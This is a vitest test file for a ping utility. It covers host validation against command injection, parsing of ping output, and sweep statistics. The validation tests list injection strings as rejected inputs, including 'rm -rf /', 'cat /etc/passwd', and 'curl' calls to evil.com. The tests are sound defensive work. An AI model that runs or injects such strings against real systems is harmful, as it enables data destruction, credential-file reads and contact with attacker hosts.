/**
 * Tests for PingTool.
 *
 * Since icmpPing is a module-level private function that binds `exec` at
 * import time (making it difficult to mock in ESM), we test:
 *
 *  1. The host validation regex directly — this is the security-critical path
 *  2. The output parsing regexes directly — these are the logic-critical paths
 *  3. PingSweep statistics computation
 *
 * The validation and parsing tests exercise the exact patterns from the source.
 */

import { describe, it, expect } from 'vitest';

// ── Host validation regex (extracted from icmpPing) ───────────────────────
// Source: /^[\w.\-:]+$/
const HOST_REGEX = /^[\w.\-:]+$/;

describe('Host validation regex (command injection prevention)', () => {
  // These should all be REJECTED (return false)
  const maliciousInputs = [
    { input: '10.0.0.1; rm -rf /', reason: 'semicolon command chaining' },
    { input: '`whoami`.evil.com', reason: 'backtick injection' },
    { input: '10.0.0.1 | cat /etc/passwd', reason: 'pipe character' },
    { input: '$(curl evil.com)', reason: '$() subshell expansion' },
    { input: '10.0.0.1 && curl evil.com', reason: 'ampersand chaining' },
    { input: '10.0.0.1\nwhoami', reason: 'newline injection' },
    { input: 'host"inject', reason: 'double quote' },
    { input: "host'inject", reason: 'single quote' },
    { input: 'host>file', reason: 'redirect operator' },
    { input: '', reason: 'empty string' },
  ];

  for (const { input, reason } of maliciousInputs) {
    it(`should reject: ${reason} ("${input}")`, () => {
      expect(HOST_REGEX.test(input)).toBe(false);
    });
  }

  // These should all be ACCEPTED (return true)
  const validInputs = [
    { input: '10.0.0.1', reason: 'IPv4 address' },
    { input: '192.168.1.254', reason: 'IPv4 address high octets' },
    { input: 'switch-01.local', reason: 'hostname with hyphen and dot' },
    { input: 'my_switch.corp.net', reason: 'hostname with underscore' },
    { input: '::1', reason: 'IPv6 loopback' },
    { input: 'fe80::1', reason: 'IPv6 link-local' },
    { input: '2001:db8::1', reason: 'IPv6 documentation address' },
    { input: 'localhost', reason: 'simple hostname' },
    { input: 'SWITCH01', reason: 'uppercase hostname' },
  ];

  for (const { input, reason } of validInputs) {
    it(`should accept: ${reason} ("${input}")`, () => {
      expect(HOST_REGEX.test(input)).toBe(true);
    });
  }
});

// ── Windows ping output parsing regexes ──────────────────────────────────
// Source: stdout.match(/time[=<](\d+(?:\.\d+)?)\s*ms/i)
//         stdout.match(/TTL[=](\d+)/i)

const WINDOWS_TIME_REGEX = /time[=<](\d+(?:\.\d+)?)\s*ms/i;
const TTL_REGEX = /TTL[=](\d+)/i;

describe('Windows ping output parsing', () => {
  it('should parse standard reply with integer latency', () => {
    const output = 'Reply from 192.168.1.1: bytes=32 time=5ms TTL=64';
    const timeMatch = output.match(WINDOWS_TIME_REGEX);
    const ttlMatch = output.match(TTL_REGEX);

    expect(timeMatch).not.toBeNull();
    expect(parseFloat(timeMatch![1])).toBe(5);
    expect(ttlMatch).not.toBeNull();
    expect(parseInt(ttlMatch![1], 10)).toBe(64);
  });

  it('should parse reply with time<1ms (sub-millisecond)', () => {
    const output = 'Reply from 192.168.1.1: bytes=32 time<1ms TTL=128';
    const timeMatch = output.match(WINDOWS_TIME_REGEX);
    const ttlMatch = output.match(TTL_REGEX);

    expect(timeMatch).not.toBeNull();
    expect(parseFloat(timeMatch![1])).toBe(1);
    expect(ttlMatch).not.toBeNull();
    expect(parseInt(ttlMatch![1], 10)).toBe(128);
  });

  it('should parse reply with decimal latency', () => {
    const output = 'Reply from 10.0.0.1: bytes=32 time=23.5ms TTL=255';
    const timeMatch = output.match(WINDOWS_TIME_REGEX);

    expect(timeMatch).not.toBeNull();
    expect(parseFloat(timeMatch![1])).toBe(23.5);
  });

  it('should parse reply with large latency', () => {
    const output = 'Reply from 8.8.8.8: bytes=32 time=142ms TTL=115';
    const timeMatch = output.match(WINDOWS_TIME_REGEX);
    const ttlMatch = output.match(TTL_REGEX);

    expect(timeMatch).not.toBeNull();
    expect(parseFloat(timeMatch![1])).toBe(142);
    expect(parseInt(ttlMatch![1], 10)).toBe(115);
  });

  it('should not match on "Request timed out"', () => {
    const output = 'Request timed out.';
    const timeMatch = output.match(WINDOWS_TIME_REGEX);
    expect(timeMatch).toBeNull();
  });

  it('should not match on "Destination host unreachable"', () => {
    const output = 'Reply from 10.0.0.1: Destination host unreachable.';
    const timeMatch = output.match(WINDOWS_TIME_REGEX);
    expect(timeMatch).toBeNull();
  });
});

// ── Linux/macOS ping output parsing regexes ──────────────────────────────
// Source: stdout.match(/time[=](\d+(?:\.\d+)?)\s*ms/i)
//         stdout.match(/ttl[=](\d+)/i)

const LINUX_TIME_REGEX = /time[=](\d+(?:\.\d+)?)\s*ms/i;

describe('Linux/macOS ping output parsing', () => {
  it('should parse standard Linux reply with decimal latency', () => {
    const output = '64 bytes from 10.0.0.1: icmp_seq=1 ttl=64 time=1.23 ms';
    const timeMatch = output.match(LINUX_TIME_REGEX);
    const ttlMatch = output.match(TTL_REGEX);

    expect(timeMatch).not.toBeNull();
    expect(parseFloat(timeMatch![1])).toBe(1.23);
    expect(ttlMatch).not.toBeNull();
    expect(parseInt(ttlMatch![1], 10)).toBe(64);
  });

  it('should parse macOS ping with sub-ms response', () => {
    const output = '64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.042 ms';
    const timeMatch = output.match(LINUX_TIME_REGEX);

    expect(timeMatch).not.toBeNull();
    expect(parseFloat(timeMatch![1])).toBe(0.042);
  });

  it('should parse high-latency reply', () => {
    const output = '64 bytes from 203.0.113.1: icmp_seq=1 ttl=48 time=287.4 ms';
    const timeMatch = output.match(LINUX_TIME_REGEX);
    const ttlMatch = output.match(TTL_REGEX);

    expect(timeMatch).not.toBeNull();
    expect(parseFloat(timeMatch![1])).toBe(287.4);
    expect(parseInt(ttlMatch![1], 10)).toBe(48);
  });

  it('should not match Linux "time exceeded" message (no = sign for time)', () => {
    // The Linux regex uses time= (not time<), so it should not match text without =
    const output = 'From 10.0.0.1 icmp_seq=1 Time to live exceeded';
    const timeMatch = output.match(LINUX_TIME_REGEX);
    expect(timeMatch).toBeNull();
  });
});

// ── PingSweep statistics computation ─────────────────────────────────────
// Test the stats computation logic in isolation

describe('PingSweep statistics computation', () => {
  // Replicate the stats computation from PingTool.pingSweep
  function computeStats(results: Array<{ alive: boolean; latencyMs: number }>) {
    const alive = results.filter((r) => r.alive);
    const dead = results.filter((r) => !r.alive);
    const latencies = alive.map((r) => r.latencyMs).filter((l) => l > 0);

    return {
      totalAlive: alive.length,
      totalDead: dead.length,
      avgLatencyMs:
        latencies.length > 0
          ? Math.round(
              (latencies.reduce((a, b) => a + b, 0) / latencies.length) * 100,
            ) / 100
          : 0,
      maxLatencyMs: latencies.length > 0 ? Math.max(...latencies) : 0,
      minLatencyMs: latencies.length > 0 ? Math.min(...latencies) : 0,
    };
  }

  it('should compute correct stats for mixed alive/dead hosts', () => {
    const stats = computeStats([
      { alive: true, latencyMs: 5 },
      { alive: false, latencyMs: -1 },
      { alive: true, latencyMs: 10 },
    ]);

    expect(stats.totalAlive).toBe(2);
    expect(stats.totalDead).toBe(1);
    expect(stats.avgLatencyMs).toBe(7.5);
    expect(stats.minLatencyMs).toBe(5);
    expect(stats.maxLatencyMs).toBe(10);
  });

  it('should return zeros when all hosts are dead', () => {
    const stats = computeStats([
      { alive: false, latencyMs: -1 },
      { alive: false, latencyMs: -1 },
    ]);

    expect(stats.totalAlive).toBe(0);
    expect(stats.totalDead).toBe(2);
    expect(stats.avgLatencyMs).toBe(0);
    expect(stats.minLatencyMs).toBe(0);
    expect(stats.maxLatencyMs).toBe(0);
  });

  it('should compute correct stats when all hosts are alive', () => {
    const stats = computeStats([
      { alive: true, latencyMs: 1 },
      { alive: true, latencyMs: 2 },
      { alive: true, latencyMs: 3 },
    ]);

    expect(stats.totalAlive).toBe(3);
    expect(stats.totalDead).toBe(0);
    expect(stats.avgLatencyMs).toBe(2);
    expect(stats.minLatencyMs).toBe(1);
    expect(stats.maxLatencyMs).toBe(3);
  });

  it('should round average to 2 decimal places', () => {
    const stats = computeStats([
      { alive: true, latencyMs: 1 },
      { alive: true, latencyMs: 2 },
      { alive: true, latencyMs: 3 },
      // average = 2.0, but let's test with values that produce fractions
    ]);

    // 1+2+3 = 6, /3 = 2.0 -- too clean. Use different values:
    const stats2 = computeStats([
      { alive: true, latencyMs: 1.1 },
      { alive: true, latencyMs: 2.2 },
      { alive: true, latencyMs: 3.3 },
    ]);

    // (1.1 + 2.2 + 3.3) / 3 = 2.2
    expect(stats2.avgLatencyMs).toBe(2.2);
  });

  it('should handle single host', () => {
    const stats = computeStats([{ alive: true, latencyMs: 42 }]);

    expect(stats.totalAlive).toBe(1);
    expect(stats.totalDead).toBe(0);
    expect(stats.avgLatencyMs).toBe(42);
    expect(stats.minLatencyMs).toBe(42);
    expect(stats.maxLatencyMs).toBe(42);
  });

  it('should handle empty results', () => {
    const stats = computeStats([]);

    expect(stats.totalAlive).toBe(0);
    expect(stats.totalDead).toBe(0);
    expect(stats.avgLatencyMs).toBe(0);
  });
});
